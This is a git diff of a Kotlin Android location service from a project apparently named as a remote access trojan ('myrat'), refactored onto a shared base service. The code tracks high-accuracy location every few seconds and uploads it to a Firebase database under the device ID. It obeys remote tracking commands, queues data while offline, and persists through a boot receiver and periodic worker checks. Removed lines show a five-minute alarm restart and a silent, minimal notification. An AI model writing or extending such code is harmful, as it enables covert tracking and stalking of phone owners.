@@ -1,22 +1,16 @@
 package com.myrat.app.service
 
-import android.Manifest
-import android.app.*
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.SharedPreferences
-import android.content.pm.PackageManager
 import android.content.pm.ServiceInfo
 import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.Build
 import android.os.IBinder
 import android.os.Looper
-import android.os.SystemClock
-import androidx.core.app.ActivityCompat
-import androidx.core.app.NotificationCompat
 import androidx.work.*
 import com.google.android.gms.location.*
 import com.google.firebase.database.DataSnapshot
@@ -24,14 +18,20 @@ import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.database.ValueEventListener
 import com.myrat.app.MainActivity
-import com.myrat.app.R
+import com.myrat.app.utils.Constants
 import com.myrat.app.utils.Logger
+import com.myrat.app.utils.PermissionUtils
 import com.myrat.app.worker.LastLocationWorker
 import com.myrat.app.worker.ServiceCheckWorker
 import kotlinx.coroutines.*
 import java.util.concurrent.TimeUnit
 
-class LocationService : Service() {
+class LocationService : BaseService() {
+    
+    override val notificationId = 5
+    override val channelId = Constants.NOTIFICATION_CHANNEL_LOCATION
+    override val serviceName = "LocationService"
+    
     private val db = FirebaseDatabase.getInstance().reference
     private lateinit var deviceId: String
     private lateinit var sharedPref: SharedPreferences
@@ -39,8 +39,6 @@ class LocationService : Service() {
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var isTracking = false
     private var lastLocationTimestamp = 0L
-    private val NOTIFICATION_ID = 5
-    private val CHANNEL_ID = "LocationTracker"
     private val WORK_NAME = "LocationServiceCheck"
     private val LAST_LOCATION_WORK_NAME = "LastLocationUpdate"
     private val pendingRealTimeLocations = mutableListOf<Map<String, Any>>()
@@ -53,98 +51,53 @@ class LocationService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        deviceId = MainActivity.getDeviceId(this)
-        sharedPref = getSharedPreferences("location_pref", Context.MODE_PRIVATE)
-        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
-        Logger.log("LocationService started for deviceId: $deviceId")
+        try {
+            deviceId = MainActivity.getDeviceId(this)
+            sharedPref = getSharedPreferences("location_pref", Context.MODE_PRIVATE)
+            fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+            Logger.log("LocationService started for deviceId: $deviceId")
 
-        scheduleRestart(this)
-        startForegroundService()
-        setupLocationUpdates()
-        listenForLocationCommands()
-        registerBootReceiver()
-        scheduleServiceCheck()
-        scheduleLastLocationUpdate()
-        checkAndUploadPendingLocations()
+            startForegroundService("Location Service", "Running in background")
+            setupLocationUpdates()
+            listenForLocationCommands()
+            registerBootReceiver()
+            scheduleServiceCheck()
+            scheduleLastLocationUpdate()
+            checkAndUploadPendingLocations()
+        } catch (e: Exception) {
+            Logger.error("Failed to create LocationService", e)
+            stopSelf()
+        }
     }
 
-    private fun scheduleRestart(context: Context) {
-        val alarmIntent = Intent(context, LocationService::class.java)
-        val pendingIntent = PendingIntent.getService(
-            context, 0, alarmIntent,
-            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-        )
-
-
-        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
-        alarmManager.setRepeating(
-            AlarmManager.ELAPSED_REALTIME_WAKEUP,
-            SystemClock.elapsedRealtime() + 60_000, // delay before restart
-            5 * 60_000, // repeat every 5 minutes
-            pendingIntent
-        )
-    }
-
-    private fun startForegroundService() {
-        val channelName = "Location Tracking Service"
-        val manager = getSystemService(NotificationManager::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID,
-                channelName,
-                NotificationManager.IMPORTANCE_MIN
-            ).apply {
-                setShowBadge(false)
-                enableLights(false)
-                enableVibration(false)
-                setSound(null, null)
-            }
-            manager?.createNotificationChannel(channel)
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        // Check permissions before starting
+        if (!PermissionUtils.hasForegroundLocationPermissions(this)) {
+            Logger.error("Missing location permissions, stopping LocationService")
+            stopSelf()
+            return START_NOT_STICKY
         }
-
-        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Location Service")
-            .setContentText("Running in background")
-            .setSmallIcon(R.drawable.ic_launcher_foreground)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setSilent(true)
-            .setShowWhen(false)
-            .build()
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(
-                NOTIFICATION_ID,
-                notification,
-                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
-            )
-        } else {
-            startForeground(NOTIFICATION_ID, notification)
-        }
+        
+        Logger.log("LocationService onStartCommand")
+        return super.onStartCommand(intent, flags, startId)
     }
 
     private fun setupLocationUpdates() {
-        if (!hasLocationPermissions()) {
+        if (!PermissionUtils.hasForegroundLocationPermissions(this)) {
             Logger.log("Location permissions not granted")
             stopSelf()
             return
         }
 
         val locationRequest = LocationRequest.create().apply {
-            interval = 10_000 // 10 seconds
-            fastestInterval = 5_000 // 5 seconds
+            interval = Constants.LOCATION_UPDATE_INTERVAL
+            fastestInterval = Constants.LOCATION_FASTEST_INTERVAL
             priority = LocationRequest.PRIORITY_HIGH_ACCURACY
         }
 
         try {
-            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
-                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
-            ) {
-                fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper())
-                Logger.log("Location updates requested")
-            } else {
-                Logger.log("Location permissions missing for requestLocationUpdates")
-                stopSelf()
-            }
+            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper())
+            Logger.log("Location updates requested")
         } catch (e: SecurityException) {
             Logger.log("SecurityException in requestLocationUpdates: ${e.message}")
             stopSelf()
@@ -157,7 +110,6 @@ class LocationService : Service() {
                 val timestamp = System.currentTimeMillis()
                 lastLocationTimestamp = timestamp
 
-                // Create location data map
                 val locationData = mapOf(
                     "latitude" to location.latitude,
                     "longitude" to location.longitude,
@@ -165,7 +117,6 @@ class LocationService : Service() {
                     "uploaded" to System.currentTimeMillis()
                 )
 
-                // Real-time tracking when isTracking is true
                 if (isTracking) {
                     scope.launch {
                         try {
@@ -231,7 +182,6 @@ class LocationService : Service() {
 
     private fun checkAndUploadPendingLocations() {
         scope.launch {
-            // Upload pending last location
             val lat = sharedPref.getFloat("last_latitude", 0f).toDouble()
             val lon = sharedPref.getFloat("last_longitude", 0f).toDouble()
             val timestamp = sharedPref.getLong("last_timestamp", 0L)
@@ -251,7 +201,6 @@ class LocationService : Service() {
                 }
             }
 
-            // Upload pending real-time locations
             synchronized(pendingRealTimeLocations) {
                 if (pendingRealTimeLocations.isNotEmpty() && hasInternet()) {
                     val currentTime = System.currentTimeMillis()
@@ -271,7 +220,6 @@ class LocationService : Service() {
                 }
             }
 
-            // Upload pending current locations
             if (pendingCurrentLocations.isNotEmpty() && hasInternet()) {
                 val currentTime = System.currentTimeMillis()
                 pendingCurrentLocations.forEach { locationData ->
@@ -289,7 +237,6 @@ class LocationService : Service() {
                 pendingCurrentLocations.clear()
             }
 
-            // Upload pending history
             synchronized(pendingHistory) {
                 if (pendingHistory.isNotEmpty() && hasInternet()) {
                     pendingHistory.forEach { historyData ->
@@ -344,78 +291,72 @@ class LocationService : Service() {
     }
 
     private fun uploadCurrentLocation() {
-        if (!hasLocationPermissions()) {
+        if (!PermissionUtils.hasForegroundLocationPermissions(this)) {
             Logger.log("Location permissions not granted")
             return
         }
 
         try {
-            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
-                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
-            ) {
-                fusedLocationClient.lastLocation.addOnSuccessListener { location ->
-                    if (location != null) {
-                        val timestamp = System.currentTimeMillis()
+            fusedLocationClient.lastLocation.addOnSuccessListener { location ->
+                if (location != null) {
+                    val timestamp = System.currentTimeMillis()
+                    val locationData = mapOf(
+                        "latitude" to location.latitude,
+                        "longitude" to location.longitude,
+                        "timestamp" to timestamp,
+                        "uploaded" to System.currentTimeMillis()
+                    )
+                    scope.launch {
+                        try {
+                            if (hasInternet()) {
+                                db.child("Device").child(deviceId).child("location/current").setValue(locationData)
+                                    .addOnFailureListener { e ->
+                                        Logger.log("Failed to upload current location: ${e.message}")
+                                        pendingCurrentLocations.add(locationData)
+                                    }
+                                Logger.log("Current location uploaded: (${location.latitude}, ${location.longitude})")
+                            } else {
+                                pendingCurrentLocations.add(locationData)
+                                saveLastLocation(location.latitude, location.longitude, timestamp)
+                                Logger.log("No internet, current location queued: (${location.latitude}, ${location.longitude})")
+                            }
+                        } catch (e: Exception) {
+                            Logger.log("Error uploading current location: ${e.message}")
+                            pendingCurrentLocations.add(locationData)
+                        }
+                    }
+                } else {
+                    val lat = sharedPref.getFloat("last_latitude", 0f).toDouble()
+                    val lon = sharedPref.getFloat("last_longitude", 0f).toDouble()
+                    val timestamp = sharedPref.getLong("last_timestamp", 0L)
+                    if (timestamp > 0) {
                         val locationData = mapOf(
-                            "latitude" to location.latitude,
-                            "longitude" to location.longitude,
+                            "latitude" to lat,
+                            "longitude" to lon,
                             "timestamp" to timestamp,
-                            "uploaded" to System.currentTimeMillis()
+                            "uploaded" to System.currentTimeMillis(),
+                            "isOffline" to true
                         )
                         scope.launch {
-                            try {
-                                if (hasInternet()) {
+                            if (hasInternet()) {
+                                try {
                                     db.child("Device").child(deviceId).child("location/current").setValue(locationData)
-                                        .addOnFailureListener { e ->
-                                            Logger.log("Failed to upload current location: ${e.message}")
-                                            pendingCurrentLocations.add(locationData)
-                                        }
-                                    Logger.log("Current location uploaded: (${location.latitude}, ${location.longitude})")
-                                } else {
+                                    Logger.log("Uploaded last known location (offline): ($lat, $lon)")
+                                } catch (e: Exception) {
+                                    Logger.log("Error uploading offline location: ${e.message}")
                                     pendingCurrentLocations.add(locationData)
-                                    saveLastLocation(location.latitude, location.longitude, timestamp)
-                                    Logger.log("No internet, current location queued: (${location.latitude}, ${location.longitude})")
                                 }
-                            } catch (e: Exception) {
-                                Logger.log("Error uploading current location: ${e.message}")
+                            } else {
                                 pendingCurrentLocations.add(locationData)
+                                Logger.log("No internet, offline location queued")
                             }
                         }
                     } else {
-                        val lat = sharedPref.getFloat("last_latitude", 0f).toDouble()
-                        val lon = sharedPref.getFloat("last_longitude", 0f).toDouble()
-                        val timestamp = sharedPref.getLong("last_timestamp", 0L)
-                        if (timestamp > 0) {
-                            val locationData = mapOf(
-                                "latitude" to lat,
-                                "longitude" to lon,
-                                "timestamp" to timestamp,
-                                "uploaded" to System.currentTimeMillis(),
-                                "isOffline" to true
-                            )
-                            scope.launch {
-                                if (hasInternet()) {
-                                    try {
-                                        db.child("Device").child(deviceId).child("location/current").setValue(locationData)
-                                        Logger.log("Uploaded last known location (offline): ($lat, $lon)")
-                                    } catch (e: Exception) {
-                                        Logger.log("Error uploading offline location: ${e.message}")
-                                        pendingCurrentLocations.add(locationData)
-                                    }
-                                } else {
-                                    pendingCurrentLocations.add(locationData)
-                                    Logger.log("No internet, offline location queued")
-                                }
-                            }
-                        } else {
-                            Logger.log("No last known location available")
-                        }
+                        Logger.log("No last known location available")
                     }
-                }.addOnFailureListener { e ->
-                    Logger.log("Failed to get last location: ${e.message}")
                 }
-            } else {
-                Logger.log("Location permissions missing for lastLocation")
+            }.addOnFailureListener { e ->
+                Logger.log("Failed to get last location: ${e.message}")
             }
         } catch (e: SecurityException) {
             Logger.log("SecurityException in lastLocation: ${e.message}")
@@ -427,22 +368,6 @@ class LocationService : Service() {
         val network = connectivityManager.activeNetwork ?: return false
         val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
         return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
-    }
-
-    private fun hasLocationPermissions(): Boolean {
-        return ActivityCompat.checkSelfPermission(
-            this,
-            Manifest.permission.ACCESS_FINE_LOCATION
-        ) == PackageManager.PERMISSION_GRANTED &&
-                ActivityCompat.checkSelfPermission(
-                    this,
-                    Manifest.permission.ACCESS_COARSE_LOCATION
-                ) == PackageManager.PERMISSION_GRANTED &&
-                (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q ||
-                        ActivityCompat.checkSelfPermission(
-                            this,
-                            Manifest.permission.ACCESS_BACKGROUND_LOCATION
-                        ) == PackageManager.PERMISSION_GRANTED)
     }
 
     private fun registerBootReceiver() {
@@ -492,11 +417,6 @@ class LocationService : Service() {
             workRequest
         )
         Logger.log("Scheduled LastLocationWorker")
-    }
-
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Logger.log("LocationService onStartCommand")
-        return START_STICKY
     }
 
     override fun onDestroy() {
